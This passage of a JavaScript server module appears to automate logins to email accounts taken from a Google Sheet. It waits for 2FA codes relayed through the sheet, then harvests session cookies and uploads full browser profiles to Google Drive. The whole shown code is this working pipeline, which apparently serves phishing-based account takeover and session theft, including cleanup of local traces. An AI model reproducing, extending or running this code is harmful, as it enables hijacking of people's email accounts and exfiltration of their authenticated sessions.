          if (initialCheckResult.reachedInbox) {
               finalStatus = "COMPLETED";
          } else {
               logger.warn(`[processRow][${browserId}] Login successful but did not reach expected inbox state. Setting status to FAILED.`);
               finalStatus = "FAILED";
          }
      } else if (initialCheckResult.accountAccess && initialCheckResult.requiresVerification) {
          finalStatus = "WAITINGCODE";
      } else { // Covers email exists but login failed (accountAccess=false)
          finalStatus = "FAILED";
      }

      updateData.status = finalStatus;
      updateData.lastJsonResponse = JSON.stringify({
        browserId, email, status: finalStatus,
        emailExists: initialCheckResult.emailExists, accountAccess: initialCheckResult.accountAccess,
        reachedInbox: initialCheckResult.reachedInbox, requiresVerification: initialCheckResult.requiresVerification,
        platform, timestamp: new Date().toISOString()
      });

      if (finalStatus === "COMPLETED") {
        const browserCookies = await page.cookies();
        updateData.cookieJSON = JSON.stringify(browserCookies); // For final updateData

        // Req 3: Intermediate update - Set COMPLETED before Drive upload
        logger.info(`[processRow][${browserId}] Initial COMPLETED status. Updating sheet before Drive upload.`);
        await updateBrowserRowData(browserId, {
            status: "COMPLETED",
            cookieJSON: updateData.cookieJSON, // Ensure cookie is sent in this intermediate update
            lastJsonResponse: updateData.lastJsonResponse 
        });

        if (browser) {
          if (targetCreatedListener) browser.off('targetcreated', targetCreatedListener);
          logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
          await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
          browserFullyClosed = true;
          await new Promise(resolve => setTimeout(resolve, 1000)); // Shorter delay after close before upload
        }

        let uploadedDriveUrl = null;
        try {
          uploadedDriveUrl = await uploadBrowserData(browserId);
          if (uploadedDriveUrl) {
            updateData.driveUrl = uploadedDriveUrl;
            logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
          } else {
            logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
          }
        } catch (uploadError) {
          logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
        }
        
        // Req 4: Delete userDataDir if COMPLETED and driveUrl exists
        if (updateData.driveUrl && userDataDir) {
          try {
            logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
            await fs.remove(userDataDir);
            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
          } catch (deleteError) {
            logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
          }
        }
      }

      if (finalStatus === "WAITINGCODE") {
          logger.info(`[processRow][${browserId}] Entering WAITINGCODE poll loop.`);
          // Update sheet to WAITINGCODE before starting poll
          await updateBrowserRowData(browserId, { status: "WAITINGCODE", lastJsonResponse: updateData.lastJsonResponse });

          const pollingTimeout = Date.now() + 5 * 60 * 1000; 
          let codeEntered = false;

          while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") { // Check local finalStatus
              try {
                  const checkData = await fetchDataFromAppScript(1, 30000); // Short retry/timeout for polling
                  const checkHeaders = checkData[0];
                  const checkColumnIndexes = getColumnIndexes(checkHeaders);
                  const checkRows = checkData.slice(1);
                  const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                  if (!checkRow) {
                      logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
                      finalStatus = "FAILED"; // Update local finalStatus
                      break;
                  }

                  const currentSheetStatus = checkRow[checkColumnIndexes['status']];
                  const verificationCode = checkRow[checkColumnIndexes['verificationCode']];

                  if (currentSheetStatus !== "WAITINGCODE") {
                      logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                      finalStatus = currentSheetStatus; // Update local finalStatus
                      break;
                  }

                  if (verificationCode) {
                      logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found.`);
                      
                      const platformConfig = platformConfigs[platform] || {};
                      const codeInputSelector = platformConfig.selectors?.verificationCodeInput;
                      const codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;

                      if (codeInputSelector && codeSubmitSelector) {
                          try {
                              await page.waitForSelector(codeInputSelector, { visible: true, timeout: 10000 });
                              await page.type(codeInputSelector, verificationCode, { delay: 50 });
                              await page.waitForSelector(codeSubmitSelector, { visible: true, timeout: 5000 });
                              
                              const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                              await page.click(codeSubmitSelector);
                              await navigationPromise;
                              
                              codeEntered = true;
                              // Removed fixed 3000ms wait after code submission
                          } catch (codeEntryError) {
                               logger.error(`[processRow][${browserId}][WAITINGCODE] Error entering/submitting code: ${codeEntryError.message}`);
                               finalStatus = "FAILED"; // Update local finalStatus
                               break;
                          }
                      } else {
                         logger.error(`[processRow][${browserId}][WAITINGCODE] Verification code input/submit selectors not defined for platform ${platform}.`);
                         finalStatus = "FAILED"; // Update local finalStatus
                         break;
                      }

                      if (codeEntered) {
                          const inboxReachedAfterCode = await isInbox(page, platformConfig);
                          if (inboxReachedAfterCode) {
                              logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code entry. Setting status to COMPLETED.`);
                              finalStatus = "COMPLETED"; // Update local finalStatus
                              
                              const browserCookies = await page.cookies();
                              const postCodeFinalStatusDetails = { 
                                browserId, email, status: "COMPLETED",
                                emailExists: initialCheckResult.emailExists, accountAccess: true, 
                                reachedInbox: true, requiresVerification: false, 
                                platform, timestamp: new Date().toISOString()
                              };
                              
                              // Update main updateData for the `finally` block
                              updateData.status = "COMPLETED";
                              updateData.cookieJSON = JSON.stringify(browserCookies);
                              updateData.lastJsonResponse = JSON.stringify(postCodeFinalStatusDetails);

                              // Req 3: Intermediate update - Set COMPLETED after code, before Drive upload
                              logger.info(`[processRow][${browserId}] COMPLETED status after code entry. Updating sheet before Drive upload.`);
                              await updateBrowserRowData(browserId, {
                                  status: "COMPLETED",
                                  cookieJSON: updateData.cookieJSON, // Ensure cookie is sent in this intermediate update
                                  lastJsonResponse: updateData.lastJsonResponse // This updateData.lastJsonResponse already has COMPLETED status
                              });
                              
                              if (browser) {
                                if (targetCreatedListener) browser.off('targetcreated', targetCreatedListener);
                                logger.info(`[processRow][${browserId}] Closing browser after successful verification.`);
                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                browserFullyClosed = true;
                                await new Promise(resolve => setTimeout(resolve, 1000));
                              }

                              let uploadedDriveUrlAfterCode = null;
                              try {
                                uploadedDriveUrlAfterCode = await uploadBrowserData(browserId);
                                if (uploadedDriveUrlAfterCode) {
                                  updateData.driveUrl = uploadedDriveUrlAfterCode;
                                  logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive after code entry.`);
                                } else {
                                  logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed after code entry.`);
                                }
                              } catch (uploadError) {
                                logger.error(`[processRow][${browserId}] Error during Google Drive upload after code entry: ${uploadError.message}`);
                              }
                              
                              // Req 4: Delete userDataDir if COMPLETED and driveUrl exists
                              if (updateData.driveUrl && userDataDir) {
                                try {
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
                                  await fs.remove(userDataDir);
                                  logger.info(`[processRow][${browserId}][WAITINGCODE] Successfully deleted user data directory.`);
                                } catch (deleteError) {
                                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error deleting user data directory after completion: ${deleteError.message}`);
                                }
                              }
                              break; // Exit WAITINGCODE loop
                          } else {
                              logger.warn(`[processRow][${browserId}][WAITINGCODE] Code entered, but inbox not reached. Setting status to FAILED.`);
                              finalStatus = "FAILED"; // Update local finalStatus
                              updateData.status = "FAILED"; // Update main updateData
                              updateData.lastJsonResponse = JSON.stringify({
                                  browserId, email, status: "FAILED",
                                  message: "Code entered, but inbox not reached.",
                                  emailExists: initialCheckResult.emailExists, accountAccess: true, 
                                  reachedInbox: false, requiresVerification: false, // Assuming verification was attempted
                                  platform, timestamp: new Date().toISOString()
                              });
                              break;
                          }
                      } else { // Should not happen if break occurs above for FAILED
                           finalStatus = "FAILED";
                           break;
                      }
                  } else {
                      // No code found yet, wait before next poll
                      logger.debug(`[processRow][${browserId}][WAITINGCODE] No code found yet. Waiting...`);
                  }

              } catch (pollError) {
                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error during polling: ${pollError.message}`);
                  // Wait longer after a polling error before retrying
                  await new Promise(resolve => setTimeout(resolve, 15000)); 
              }
              
              // Wait before next poll attempt if still waiting for code
              if (finalStatus === "WAITINGCODE") { 
                 await new Promise(resolve => setTimeout(resolve, 10000));
              }
          } // End of WAITINGCODE while loop

          if (finalStatus === "WAITINGCODE") { // Polling timed out
             logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling timed out after 5 minutes. Setting status to FAILED.`);
             finalStatus = "FAILED"; // Update local finalStatus
          }
          
          // Ensure updateData reflects the outcome of WAITINGCODE phase
          // If it's COMPLETED, it was set inside the loop. If it failed or timed out, set it here.
          if (updateData.status !== "COMPLETED") { 
            updateData.status = finalStatus; // Should be FAILED or externally changed status
            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) { // If not already specific FAILED JSON
                updateData.lastJsonResponse = JSON.stringify({
                    browserId, email, status: "FAILED", message: "Polling timed out or failed during WAITINGCODE.",
                    emailExists: initialCheckResult.emailExists, accountAccess: initialCheckResult.accountAccess,
                    reachedInbox: initialCheckResult.reachedInbox, requiresVerification: true, // Was waiting for code
                    platform, timestamp: new Date().toISOString()
                });
            }
          }
          logger.info(`[processRow][${browserId}] Exited WAITINGCODE loop. Final status for sheet update: ${updateData.status}`);
      }

    } catch (error) {
      logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
      updateData.status = "FAILED"; // Ensure updateData reflects this for the `finally` block
      updateData.lastJsonResponse = JSON.stringify({
            browserId, email, status: "FAILED", error: error.message, 
            platform, timestamp: new Date().toISOString()
      });
    } finally {
      // Ensure browser is closed unless WAITINGCODE
      if (browser && !browserFullyClosed) {
        if (targetCreatedListener) browser.off('targetcreated', targetCreatedListener);
        
        if (updateData.status !== "WAITINGCODE") { 
          logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
          await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
          browserFullyClosed = true;
          await new Promise(resolve => setTimeout(resolve, 1000));
        } else {
          logger.info(`[processRow][${browserId}] Keeping browser open as it remains in WAITINGCODE state (in finally).`);
        }
      }

      // Final update to the sheet
      logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(updateData)}`);
      await updateBrowserRowData(browserId, updateData).catch(err => 
        logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
      );
      
      // Delete user data if FAILED or (COMPLETED and Uploaded)
      // Note: Deletion for COMPLETED+Uploaded is handled within the main try block now.
      if (updateData.status === "FAILED" && userDataDir) {
        if (browserFullyClosed || !browser?.isConnected?.()) { // Ensure browser is closed
            try {
              logger.info(`[processRow][${browserId}] Final status FAILED. Deleting user data directory: ${userDataDir}`);
              await fs.remove(userDataDir);
              logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
            } catch (deleteError) {
              logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`);
            }
        } else {
             logger.warn(`[processRow][${browserId}] Final status FAILED, but browser not confirmed closed. Skipping userDataDir deletion.`);
        }
      }
    }
}

// Flag to prevent the interval timer from overlapping runs if a run takes longer than the interval
let isProcessingInterval = false; 

async function processWaitingRows() { 
  if (isProcessingInterval) {
    logger.debug("Interval check skipped: Previous run still in progress.");
    return;
  }
  isProcessingInterval = true;
  logger.info(`Interval check running. Active processes: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

  try {
    const availableSlots = MAX_CONCURRENT_BROWSERS - activeProcesses.size;
    if (availableSlots <= 0) {
      logger.info("Concurrency limit reached. No available slots.");
      isProcessingInterval = false; // Release lock early if no slots
      return;
    }

    const data = await fetchDataFromAppScript();
    
    if (!Array.isArray(data) || data.length === 0) {
      logger.warn('Invalid or empty data fetched from App Script.');
      isProcessingInterval = false; // Release lock if no data
      return;
    }

    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const rows = data.slice(1);

    // Find rows that are WAITING and not already being processed
    const waitingRows = rows.filter(row => 
        row[columnIndexes['status']] === "WAITING" && 
        !activeProcesses.has(row[columnIndexes['browserId']])
    );

    if (waitingRows.length === 0) {
      logger.info("No new WAITING rows found to process.");
      isProcessingInterval = false; // Release lock if no rows
      return;
    }

    // Determine how many rows to process in this interval run
    const rowsToProcess = waitingRows.slice(0, availableSlots);
    logger.info(`Found ${waitingRows.length} waiting rows. Processing ${rowsToProcess.length} rows in this run.`);

    // Launch processing for each selected row without awaiting completion here
    for (const rowToProcess of rowsToProcess) {
        const browserId = rowToProcess[columnIndexes['browserId']];
        
        // Add to active set *before* starting the async process
        activeProcesses.add(browserId);
        logger.info(`Starting processing for ${browserId}. Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

        // Start processRow but don't await it
        processRow(rowToProcess, columnIndexes)
            .catch(err => {
                // Catch errors specifically from the processRow execution itself
                logger.error(`[processWaitingRows] Uncaught error during processRow for ${browserId}: ${err.message}`, err);
                // Ensure status is updated to FAILED if processRow crashes unexpectedly
                updateBrowserRowData(browserId, { 
                    status: "FAILED", 
                    lastJsonResponse: JSON.stringify({ 
                        browserId, status: "FAILED", error: `processRow crashed: ${err.message}`, timestamp: new Date().toISOString() 
                    }) 
                }).catch(updateErr => logger.error(`[processWaitingRows] Failed to update sheet to FAILED after processRow crash for ${browserId}: ${updateErr.message}`));
            })
            .finally(() => {
                // Remove from active set *after* processRow completes or fails
                activeProcesses.delete(browserId);
                logger.info(`Finished processing for ${browserId}. Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);
            });
    }

  } catch (error) {
    logger.error('Error in processWaitingRows:', error.message, error); 
  } finally {
    isProcessingInterval = false; // Release the lock for the next interval
    logger.debug("Interval check finished.");
  }
}

// Start the interval check immediately and then run every 10 seconds
// Ensure this setup only runs once when the module loads
let intervalId = null;
if (typeof intervalId !== 'number') { // Basic check to prevent multiple intervals if module reloads somehow
    logger.info("Setting up background processing interval...");
    processWaitingRows(); // Initial run
    intervalId = setInterval(processWaitingRows, 10000); // Check every 10 seconds
    logger.info(`Background processing interval set up with ID: ${intervalId}`);
} else {
    logger.warn("Background processing interval already appears to be set up.");
}


export async function OPTIONS() {
  return setCorsHeaders(NextResponse.json({}, { status: 200 }));
}
